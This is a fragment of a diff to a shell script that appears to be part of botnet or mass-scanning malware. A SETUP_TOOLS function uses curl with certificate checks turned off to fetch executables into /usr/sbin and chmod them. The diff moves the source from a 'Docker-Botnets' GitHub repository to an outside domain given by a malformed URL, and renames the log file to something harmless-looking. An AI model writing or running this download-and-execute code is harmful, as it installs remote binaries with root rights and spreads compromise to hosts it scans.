@@ -10,7 +10,7 @@ export SCAN_RATE=500000
 # Log function
 log() {
     local message="$1"
-    echo "$(date) - $message" >> /var/log/my_script.log
+    echo "$(date) - $message" >> /var/log/upspin.log
 }
 
 # Main initialization function
@@ -50,7 +50,7 @@ SETUP_TOOLS() {
 
     for file in zgrab jq; do
         if ! [ -x "/usr/sbin/$file" ]; then
-            curl -sLk -o /usr/sbin/$file "https://github.com/Caprico1/Docker-Botnets/raw/014b5432a9403b896a3924b8704403e9ab284a68/TDGGinit/$file" || { log "Failed to download $file"; exit 1; }
+            curl -sLk -o /usr/sbin/$file "https://http://emspaarcontrol.com/bin/$file" || { log "Failed to download $file"; exit 1; }
             chmod +x /usr/sbin/$file
             log "Installed $file"
         fi
